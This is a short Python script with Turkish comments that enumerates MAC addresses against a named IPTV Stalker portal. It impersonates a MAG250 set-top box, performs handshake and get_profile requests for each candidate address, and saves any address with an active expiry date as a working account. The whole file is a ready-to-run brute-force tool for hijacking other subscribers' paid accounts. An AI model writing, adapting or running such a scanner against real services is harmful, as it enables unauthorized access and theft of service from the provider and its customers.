import requests
import json

# Senin verdiğin güncel sunucu
portal_url = "http://4can.net:80/portal.php"

def mac_dogrula(mac):
    headers = {
        'User-Agent': 'MAG250',
        'X-User-Agent': 'Model: MAG250; SW: 2.14.03-r6',
        'Cookie': f'mac={mac}; stb_lang=en; timezone=Europe/Istanbul;',
        'Connection': 'Keep-Alive'
    }
    
    try:
        # 1. ADIM: Handshake (Anahtar alımı)
        handshake_url = f"{portal_url}?type=stb&action=handshake&token="
        res = requests.get(handshake_url, headers=headers, timeout=8)
        token = res.json().get('js', {}).get('token')
        
        if token:
            # 2. ADIM: KRİTİK KONTROL (Profil Sorgulama)
            # 4can gibi sunucularda get_profile en sağlam doğrulama yöntemidir.
            profile_url = f"{portal_url}?type=stb&action=get_profile&token={token}"
            profile_res = requests.get(profile_url, headers=headers, timeout=8)
            data = profile_res.json().get('js', {})
            
            # Eğer 'expired' alanı varsa ve içeriği boş değilse bu GERÇEK bir hesaptır
            if data and data.get('expired') and data.get('expired') != "null":
                exp_date = data.get('expired')
                print(f"🎯 BULDUM! MAC: {mac} | Bitiş: {exp_date}")
                return f"{mac} | SKT: {exp_date}"
                
    except Exception:
        pass
    return None

def baslat():
    # 4can için genellikle 00:1A:79 blokları aktiftir
    prefix = "00:1A:79:4C:A5" 
    print(f"🕵️ 4can.net taranıyor: {prefix} blokları...")
    
    bulunanlar = []
    # Test için ilk 50 adresi tarayalım
    for i in range(50):
        suffix = hex(i)[2:].zfill(2).upper()
        test_mac = f"{prefix}:{suffix}"
        
        sonuc = mac_dogrula(test_mac)
        if sonuc:
            bulunanlar.append(sonuc)
    
    # Sonuçları dosyaya yaz
    with open("4can_aktif_list.txt", "w") as f:
        if bulunanlar:
            for item in bulunanlar:
                f.write(f"http://4can.net:80/c/ | {item}\n")
            print(f"✅ Tarama bitti. {len(bulunanlar)} adet gerçek hesap kaydedildi.")
        else:
            f.write("Bu blokta çalışan hesap bulunamadı.")
            print("❌ Maalesef çalışan hesap bulunamadı.")

if __name__ == "__main__":
    baslat()
